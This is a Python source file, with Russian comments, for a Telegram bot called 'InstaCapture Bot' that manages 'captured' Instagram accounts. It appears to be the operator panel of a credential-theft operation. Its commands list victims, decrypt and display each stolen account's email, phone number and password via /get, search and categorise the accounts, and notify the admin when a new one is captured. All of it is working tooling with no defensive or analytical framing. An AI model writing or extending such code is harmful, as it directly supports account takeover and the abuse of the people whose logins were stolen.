"""
telegram_bot.py — Telegram-бот для управления захваченными аккаунтами.
Фреймворк: aiogram 3.x (асинхронный).
Доступ строго по ADMIN_CHAT_ID — проверка на каждой команде.

Команды:
/start       — приветствие, проверка доступа
/list        — список аккаунтов (без паролей)
/get {user}  — полные данные аккаунта (с расшифровкой)
/delete {id} — удалить аккаунт
/categories  — управление категориями
/search {q}  — поиск по email/phone/username
"""

import logging
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import Message
from sqlalchemy.orm import Session

from app.config import settings
from app.crypto import crypto
from app.database import SessionLocal
from app.models import InstagramAccount

logger = logging.getLogger(__name__)

# Инициализация бота (если токен задан)
bot = Bot(token=settings.TELEGRAM_BOT_TOKEN) if settings.TELEGRAM_BOT_TOKEN else None
dp = Dispatcher()
router = Router()


def check_access(message: Message) -> bool:
    """Проверка, что пользователь — администратор."""
    if not settings.ADMIN_CHAT_ID:
        return False
    return str(message.chat.id) == str(settings.ADMIN_CHAT_ID)


def get_db() -> Session:
    """Получение сессии БД."""
    return SessionLocal()


@router.message(Command("start"))
async def cmd_start(message: Message):
    """Приветственное сообщение + проверка доступа."""
    if not check_access(message):
        await message.answer("Доступ запрещён.")
        return

    await message.answer(
        "InstaCapture Bot — управление захваченными аккаунтами.\n\n"
        "Доступные команды:\n"
        "/list — список аккаунтов\n"
        "/get {username} — полные данные\n"
        "/delete {id} — удалить аккаунт\n"
        "/search {query} — поиск\n"
        "/categories — управление категориями"
    )


@router.message(Command("list"))
async def cmd_list(message: Message):
    """Список аккаунтов (без паролей — только username, email, дата)."""
    if not check_access(message):
        await message.answer("Доступ запрещён.")
        return

    db = get_db()
    try:
        accounts = db.query(InstagramAccount).order_by(InstagramAccount.captured_at.desc()).limit(50).all()

        if not accounts:
            await message.answer("Аккаунтов пока нет.")
            return

        lines = [f"Всего: {len(accounts)} аккаунтов\n"]
        for acc in accounts:
            lines.append(
                f"ID: {acc.id} | @{acc.username or '—'} | "
                f"Email: {acc.email_encrypted is not None} | "
                f"{acc.captured_at.strftime('%d.%m.%Y %H:%M')}"
            )

        text = "\n".join(lines)
        # Telegram ограничение — 4096 символов
        if len(text) > 4000:
            text = text[:4000] + "\n\n... (обрезано)"

        await message.answer(f"<pre>{text}</pre>", parse_mode="HTML")
    finally:
        db.close()


@router.message(Command("get"))
async def cmd_get(message: Message):
    """Полные данные аккаунта с расшифровкой пароля."""
    if not check_access(message):
        await message.answer("Доступ запрещён.")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: /get {username}")
        return

    username = args[1].strip().lstrip("@")
    db = get_db()
    try:
        acc = db.query(InstagramAccount).filter(InstagramAccount.username == username).first()
        if not acc:
            await message.answer(f"Аккаунт @{username} не найден.")
            return

        decrypted = crypto.decrypt_to_dict(acc.email_encrypted, acc.phone_encrypted, acc.password_encrypted)

        text = (
            f"Аккаунт: @{acc.username or '—'}\n"
            f"Имя: {acc.full_name or '—'}\n"
            f"Email: {decrypted['email'] or '—'}\n"
            f"Телефон: {decrypted['phone'] or '—'}\n"
            f"Пароль: <code>{decrypted['password'] or '—'}</code>\n"
            f"Категория: {acc.category}\n"
            f"Устройство: {acc.device_id}\n"
            f"Захвачен: {acc.captured_at.strftime('%d.%m.%Y %H:%M')}"
        )

        await message.answer(text, parse_mode="HTML")
    finally:
        db.close()


@router.message(Command("delete"))
async def cmd_delete(message: Message):
    """Удаление аккаунта по ID."""
    if not check_access(message):
        await message.answer("Доступ запрещён.")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: /delete {id}")
        return

    try:
        account_id = int(args[1].strip())
    except ValueError:
        await message.answer("ID должен быть числом.")
        return

    db = get_db()
    try:
        acc = db.query(InstagramAccount).filter(InstagramAccount.id == account_id).first()
        if not acc:
            await message.answer(f"Аккаунт с ID {account_id} не найден.")
            return

        username = acc.username or f"ID:{acc.id}"
        db.delete(acc)
        db.commit()
        await message.answer(f"Аккаунт @{username} удалён.")
    finally:
        db.close()


@router.message(Command("categories"))
async def cmd_categories(message: Message):
    """Управление категориями аккаунтов."""
    if not check_access(message):
        await message.answer("Доступ запрещён.")
        return

    db = get_db()
    try:
        args = message.text.split(maxsplit=2)
        if len(args) >= 3:
            # Установка категории: /categories {username} {category}
            username = args[1].strip().lstrip("@")
            category = args[2].strip()
            acc = db.query(InstagramAccount).filter(InstagramAccount.username == username).first()
            if acc:
                acc.category = category
                db.commit()
                await message.answer(f"Категория @{username} изменена на '{category}'.")
            else:
                await message.answer(f"Аккаунт @{username} не найден.")
        else:
            # Статистика по категориям
            accounts = db.query(InstagramAccount).all()
            stats: dict[str, int] = {}
            for acc in accounts:
                stats[acc.category] = stats.get(acc.category, 0) + 1

            lines = ["Статистика по категориям:\n"]
            for cat, count in sorted(stats.items()):
                lines.append(f"{cat}: {count}")
            lines.append(f"\nВсего: {len(accounts)}")
            lines.append("\nДля изменения: /categories {username} {category}")

            await message.answer("\n".join(lines))
    finally:
        db.close()


@router.message(Command("search"))
async def cmd_search(message: Message):
    """Поиск по email, phone, username."""
    if not check_access(message):
        await message.answer("Доступ запрещён.")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: /search {query}")
        return

    query = args[1].strip().lower()
    db = get_db()
    try:
        # Поиск по username (единственное нешифрованное поле для простоты)
        accounts = db.query(InstagramAccount).filter(
            InstagramAccount.username.ilike(f"%{query}%")
        ).all()

        if not accounts:
            await message.answer(f"По запросу '{query}' ничего не найдено.")
            return

        lines = [f"Результаты ({len(accounts)}):\n"]
        for acc in accounts:
            lines.append(f"ID:{acc.id} | @{acc.username or '—'} | {acc.captured_at.strftime('%d.%m.%Y')}")

        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:4000] + "\n\n... (обрезано)"
        await message.answer(f"<pre>{text}</pre>", parse_mode="HTML")
    finally:
        db.close()


# Регистрация роутера
dp.include_router(router)


async def send_notification(text: str):
    """Отправка уведомления администратору (при захвате нового аккаунта)."""
    if bot and settings.ADMIN_CHAT_ID:
        try:
            await bot.send_message(chat_id=settings.ADMIN_CHAT_ID, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Не удалось отправить уведомление в Telegram: {e}")
